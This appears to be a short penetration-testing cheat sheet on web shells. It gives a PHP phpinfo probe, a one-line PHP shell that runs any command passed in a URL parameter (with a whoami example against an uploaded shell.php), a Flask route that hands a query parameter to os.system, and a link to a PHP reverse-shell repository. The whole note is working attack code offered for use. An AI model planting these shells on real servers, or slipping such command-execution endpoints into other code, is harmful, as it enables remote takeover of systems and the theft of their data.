# Routes

Check `/usr/share/webshells` to pull templates

### Languages

### PHP

Test if data can render:

```php
# Initial test, gather info
<?php phpinfo(); ?>

# RCE (exmaple execution: example.com/uploads/shell.php?cmd=whoami)
<?php system($_GET['cmd']); ?>
```

### Python

```python
@app.route('/rs')
def rce():
    return os.system(request.args.get('cmd'))
```


### Shells

XAMPP Shells: https://github.com/ivan-sincek/php-reverse-shell/tree/master

